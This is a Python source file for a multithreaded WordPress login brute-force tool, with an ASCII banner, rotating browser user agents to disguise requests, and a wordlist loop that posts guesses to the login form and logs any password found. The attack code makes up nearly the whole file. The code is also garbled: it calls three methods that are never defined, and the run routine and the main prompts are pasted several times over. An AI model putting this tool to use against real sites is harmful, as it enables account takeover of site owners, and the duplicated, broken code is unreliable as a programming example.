import requests
import re
from urllib.parse import urlparse
import threading
import time
import random
import csv
from queue import Queue
from concurrent.futures import ThreadPoolExecutor
import logging
from tqdm import tqdm

print("""
  ____      _                 _                              
 / ___|   _| |__   ___ _ __  | |__   ___ _ __ ___   ___  ___ 
| |  | | | | '_ \ / _ \ '__| | '_ \ / _ \ '__/ _ \ / _ \/ __|
| |__| |_| | |_) |  __/ |    | | | |  __/ | | (_) |  __/\__ \
 \____\__, |_.__/ \___|_|    |_| |_|\___|_|  \___/ \___||___/
      |___/                                                  
""")

logging.basicConfig(filename='wp_brute_force.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
]

class WordPressBruteForce:
    def __init__(self, url, username, wordlist, max_threads=10):
        self.url = url
        self.username = username
        self.wordlist = wordlist
        self.max_threads = max_threads
        self.queue = Queue()
        self.found = False
        self.session = requests.Session()

    def load_wordlist(self):
        with open(self.wordlist, 'r') as f:
            return [line.strip() for line in f]

    def brute_force_task(self):
        while not self.queue.empty() and not self.found:
            password = self.queue.get()
            if self.try_login(password):
                self.found = True
                logging.info(f"Password found: {password}")
                print(f"\nPassword found: {password}")
            self.queue.task_done()

    def try_login(self, password):
        headers = {'User-Agent': random.choice(USER_AGENTS)}
        data = {
            'log': self.username,
            'pwd': password,
            'wp-submit': 'Log In'
        }
        try:
            response = self.session.post(self.url, data=data, headers=headers, timeout=5)
            if "wp-admin" in response.url:
                return True
        except requests.RequestException as e:
            logging.error(f"Request failed: {e}")
        return False





    def run(self):
        try:
            self.url = self.validate_url()
            self.detect_username()
            self.scan_vulnerabilities()
            
            passwords = self.load_wordlist()
            for password in passwords:
                self.queue.put(password)

            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                futures = [executor.submit(self.brute_force_task) for _ in range(self.max_threads)]
                
                with tqdm(total=len(passwords), desc="Testing passwords") as pbar:
                    while not self.found and not self.queue.empty():
                        completed = len(passwords) - self.queue.qsize()
                        pbar.n = completed
                        pbar.refresh()
                        time.sleep(0.1)

            if not self.found:
                print("Password not found in the wordlist.")
        except Exception as e:
            logging.error(f"An error occurred: {e}")
            print(f"An error occurred: {e}")

        try:
            self.url = self.validate_url()
            self.detect_username()
            self.scan_vulnerabilities()
            
            passwords = self.load_wordlist()
            for password in passwords:
                self.queue.put(password)

            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                futures = [executor.submit(self.brute_force_task) for _ in range(self.max_threads)]
                
                with tqdm(total=len(passwords), desc="Testing passwords") as pbar:
                    while not self.found and not self.queue.empty():
                        completed = len(passwords) - self.queue.qsize()
                        pbar.n = completed
                        pbar.refresh()
                        time.sleep(0.1)

            if not self.found:
                print("Password not found in the wordlist.")
        except Exception as e:
            logging.error(f"An error occurred: {e}")
            print(f"An error occurred: {e}")

        try:
            self.url = self.validate_url()
            self.detect_username()
            self.scan_vulnerabilities()
            
            passwords = self.load_wordlist()
            for password in passwords:
                self.queue.put(password)

            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                futures = [executor.submit(self.brute_force_task) for _ in range(self.max_threads)]
                
                with tqdm(total=len(passwords), desc="Testing passwords") as pbar:
                    while not self.found and not self.queue.empty():
                        completed = len(passwords) - self.queue.qsize()
                        pbar.n = completed
                        pbar.refresh()
                        time.sleep(0.1)

            if not self.found:
                print("Password not found in the wordlist.")
        except Exception as e:
            logging.error(f"An error occurred: {e}")
            print(f"An error occurred: {e}")

        try:
            self.url = self.validate_url()
            self.detect_username()
            self.scan_vulnerabilities()
            
            passwords = self.load_wordlist()
            for password in passwords:
                self.queue.put(password)

            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                futures = [executor.submit(self.brute_force_task) for _ in range(self.max_threads)]
                
                with tqdm(total=len(passwords), desc="Testing passwords") as pbar:
                    while not self.found and not self.queue.empty():
                        completed = len(passwords) - self.queue.qsize()
                        pbar.n = completed
                        pbar.refresh()
                        time.sleep(0.1)

            if not self.found:
                print("Password not found in the wordlist.")
        except Exception as e:
            logging.error(f"An error occurred: {e}")
            print(f"An error occurred: {e}")

        passwords = self.load_wordlist()
        for password in passwords:
            self.queue.put(password)

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = [executor.submit(self.brute_force_task) for _ in range(self.max_threads)]
            
            with tqdm(total=len(passwords), desc="Testing passwords") as pbar:
                while not self.found and not self.queue.empty():
                    completed = len(passwords) - self.queue.qsize()
                    pbar.n = completed
                    pbar.refresh()
                    time.sleep(0.1)

        if not self.found:
            print("Password not found in the wordlist.")

def main():
    print("WordPress Brute Force Tool")
    url = input("Enter WordPress URL: ")
    username = input("Enter username (or leave blank for auto-detection): ")
    wordlist = input("Enter path to wordlist: ")
    
    brute_forcer = WordPressBruteForce(url, username, wordlist)
    brute_forcer.run()

    print("WordPress Brute Force Tool")
    url = input("Enter WordPress URL: ")
    username = input("Enter username (or leave blank for auto-detection): ")
    wordlist = input("Enter path to wordlist: ")
    
    brute_forcer = WordPressBruteForce(url, username, wordlist)
    brute_forcer.run()

    print("WordPress Brute Force Tool")
    url = input("Enter WordPress URL: ")
    username = input("Enter username (or leave blank for auto-detection): ")
    wordlist = input("Enter path to wordlist: ")
    
    brute_forcer = WordPressBruteForce(url, username, wordlist)
    brute_forcer.run()

    print("WordPress Brute Force Tool")
    url = input("Enter WordPress login URL: ")
    username = input("Enter username: ")
    wordlist = input("Enter path to wordlist: ")
    
    brute_forcer = WordPressBruteForce(url, username, wordlist)
    brute_forcer.run()

if __name__ == "__main__":
    main()
